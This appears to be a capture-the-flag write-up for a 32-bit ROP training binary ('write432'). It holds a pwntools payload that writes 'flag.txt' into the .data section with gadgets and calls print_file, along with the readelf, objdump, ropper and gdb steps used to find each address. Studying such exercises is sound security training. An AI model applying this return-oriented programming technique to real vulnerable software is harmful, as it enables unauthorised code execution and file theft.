Differences from template to 32

# Build the payload
payload = flat({
    offset: [ pop_edi_pop_ebp,
    data_section_address,
    'flag',
    mov_edi_ebp,
    pop_edi_pop_ebp,
    data_section_address + 0x4,
    '.txt',
    mov_edi_ebp,
    print_file,
    0x0,
    data_section_address
    ]
})

'''\
    pop_edi_pop_ebp,            #Pop Y (ebp) at X (edi)\
    data_section_address,       #What I am writing to\
    'flag',                     #What I am writing\
    mov_edi_ebp,                #Move to make it stored\
    pop_edi_pop_ebp,            #Pop Y (ebp) at X (edi)\
    data_section_address + 0x4, #What I am writing to plus 4 since I already wrote something there\
    '.txt',                     #What I am writing\
    mov_edi_ebp,                #Move to make it stored\
    print_file,                 #Location I would like to go\
    0x0,                        #Empty Characters\
    data_section_address        #Location to read from\
'''

# How do you know what to do???
    data_section_address = 0x804a018
        readelf -S write432
            [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
            [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4

            Addr is what I need
            Size is how much I can write
            **W flag means I can write to it**
    
    mov_edi_ebp = 0x08048543
        objdump -S write432 
            08048543 <usefulGadgets>
        ropper -f write432 --search "mov"
            0x08048543: mov dword ptr [edi], ebp; ret; 
            I now need something that pops edi and ebp
    
    print_file = 0x080483d0
        gdb write432
        disas usefulFunctions
            call   0x80483d0 <print_file@plt>

    pop_edi_pop_ebp = 0x080485aa
        ropper -f write432 --search pop
            0x080485aa: pop edi; pop ebp; ret;
    
# Manual Exploitation
data_section_address = 0x0804a018\
'\x18\xa0\x04\x08'\
pop_edi_pop_ebp = 0x080485aa\
'\xaa\x85\x04\x08'\
print_file = 0x080483d0\
'\xd0\x83\x04\x08'\
mov_edi_ebp = 0x08048543\
'\x43\x85\x04\x08'\
